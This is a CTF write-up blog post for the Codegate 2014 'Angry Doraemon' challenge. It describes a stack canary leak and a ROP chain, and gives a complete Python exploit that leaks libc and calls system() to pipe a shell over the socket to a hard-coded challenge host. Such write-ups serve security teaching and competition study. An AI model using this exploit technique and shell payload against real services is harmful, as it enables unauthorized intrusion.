---
title: Codegate CTF Quals 2014 Angry Doraemon writeup
author: kelwin
layout: post
permalink: /2014-02-25-codegate-ctf-quals-2014-angry_doraemon-writeup/
comments: true
categories:
  - CTF
  - writeup
---

## Vulnerabilities
After reversing the binary, we found several vulnerabilities as below:

1. There is a suspected backdoor `execl('/bin/sh')` in the option `1.Sword`, but as a remote service, the local shell cannot interact with the client side;
2. There is an arbitrary address jump in the option `5.Fist attack`, but the addresses that start with "0x08" is not allowed;
3. There is a buffer overflow bug in the option `4.Throw mouse `. Although the related function is protected by stack canary, we can leak the whole canary by overwriting the  first byte 0x00 in the canary. 

The 3rd vulnerability is easier to exploit. We choose it to do exploitation.

## Exploitation

Exploitation steps are as below:

1. Leak the stack canary and stack address in the option `4.Throw mouse` handler;
2. Launch ROP attack to call write() in the PLT to leak libc address(e.g. write() in GOT), and then we can calculate the address of system()
3. Launch ROP attack to call system(), and the shell command can be put in the stack since we already know the stack address in step 1

## Code

```python
from zio import *
import sys

host = "58.229.183.18"
port = 8888

# STEP1: leak stack canary and stack address
io = zio((host, port), print_read=False, print_write=False)
payload = "y" + "A" * 10
io.write("4444" + payload)
io.read_until("You choose '")
io.read_until("'!\n")
leak = io.before[len(payload):]
canary = "\x00" + leak[:3]
stack_ref = l32(leak[3:7])
print "[+] canary: %s" % canary.encode('hex')
print "[+] stack addr ref: %s" % hex(stack_ref)

# STEP2: leak libc address
io = zio((host, port), print_read=False, print_write=False)
write_plt = 0x80486e0
write_got = 0x804b040
fd = 4
junk = "JJJJ"
payload = "y" + "A" * 9 + canary + junk * 3 + l32(write_plt) + junk + l32(fd) + l32(write_got) + l32(4)
io.write("4444" + payload)
io.read_until("Are you sure? (y/n) ")
write = l32(io.read(4))
system = write - 0xe0910 + 0x41260
print "[+] write: %s" % hex(write)
print "[+] system: %s" % hex(system)

# STEP3: pwn
io = zio((host, port), print_read=False, print_write=False)
cmd = "sh 0<&4 1>&4\x00"
cmd_addr = 0xbfc56788 - 0xbfc56798 + stack_ref
print "[+] cmd address: %s" % hex(cmd_addr)
payload = "y" + "A" * 9 + canary + junk * 3 + l32(system) + junk + l32(cmd_addr) + cmd
io.write("4444" + payload)
io.read_until("Are you sure? (y/n) ")
print "[+] We've got a shell;-)"
io.interact()
```
